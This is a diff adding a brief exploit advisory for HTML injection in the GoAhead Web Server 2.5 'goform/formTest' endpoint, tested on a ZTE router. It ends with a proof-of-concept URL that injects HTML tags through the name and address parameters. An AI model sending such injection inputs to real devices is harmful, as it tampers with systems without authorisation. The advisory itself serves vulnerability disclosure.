@@ -1,0 +1,14 @@
+# Exploit Title: GoAhead Web Server 2.5 - 'goform/formTest' Multiple HTML Injection Vulnerabilities
+# Date: 25/9/2023
+# Exploit Author: Syed Affan Ahmed (ZEROXINN)
+# Vendor Homepage: https://www.embedthis.com/goahead/
+# Affected Version: 2.5 may be others.
+# Tested On Version: 2.5 in ZTE AC3630
+
+---------------------------POC---------------------------
+
+GoAhead Web Server Version 2.5 is prone to Multiple HTML-injection vulnerabilities due to inadequate input validation.
+
+HTML Injection can cause the ability to execute within the context of that site.
+
+http://192.168.0.1/goform/formTest?name=<h1>Hello</h1>&address=<h1>World</h1>
